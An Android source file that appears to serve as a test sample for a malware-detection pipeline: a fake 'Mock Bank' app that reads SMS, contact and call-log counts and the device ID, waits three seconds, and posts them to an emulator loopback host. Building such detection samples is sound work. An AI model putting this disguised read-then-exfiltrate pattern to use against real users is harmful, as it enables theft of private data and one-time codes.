package space.mights.mocksample;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * A controlled stand-in for an OTP-theft app.
 *
 * It does exactly what the real ones do and nothing more: read the phone's
 * messages, contacts and call log, collect the device identifier, and post the
 * lot to a server a few seconds later. That sequence — read, then send — is the
 * pairing the dynamic pipeline exists to detect, so this is what proves the
 * pipeline works.
 *
 * The destination is loopback inside the emulator. Nothing leaves the sandbox.
 */
public class MainActivity extends Activity {

    /* 10.0.2.2 is how the emulator reaches the host it runs on. Even if a
     * listener is not running, the connection attempt is the observable event. */
    private static final String DESTINATION = "http://10.0.2.2:8099/collect";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView label = new TextView(this);
        label.setText("Mock Bank — verifying your account…");
        setContentView(label);

        new Thread(new Runnable() {
            @Override
            public void run() {
                harvest();
            }
        }).start();
    }

    private void harvest() {
        StringBuilder collected = new StringBuilder();

        collected.append("sms=").append(countRows("content://sms/inbox")).append('\n');
        collected.append("contacts=")
                .append(countRows("content://com.android.contacts/contacts"))
                .append('\n');
        collected.append("calls=").append(countRows("content://call_log/calls")).append('\n');

        try {
            TelephonyManager telephony =
                    (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            collected.append("device=").append(telephony.getDeviceId()).append('\n');
        } catch (Throwable ignored) {
            /* Newer Android refuses this to ordinary apps; the attempt is the
             * point, and the hook records it either way. */
        }

        /* The real ones wait before sending, so that the traffic does not
         * coincide with the screen the victim is looking at. */
        try {
            Thread.sleep(3000);
        } catch (InterruptedException ignored) {
        }

        send(collected.toString());
    }

    private int countRows(String uri) {
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse(uri), null, null, null, null);
            return cursor == null ? -1 : cursor.getCount();
        } catch (Throwable denied) {
            return -1;
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void send(String body) {
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(DESTINATION).openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(4000);
            OutputStream out = connection.getOutputStream();
            out.write(body.getBytes("UTF-8"));
            out.flush();
            out.close();
            connection.getResponseCode();
        } catch (Throwable ignored) {
            /* Whether anything is listening does not matter. The outbound
             * attempt is the behaviour being demonstrated. */
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}
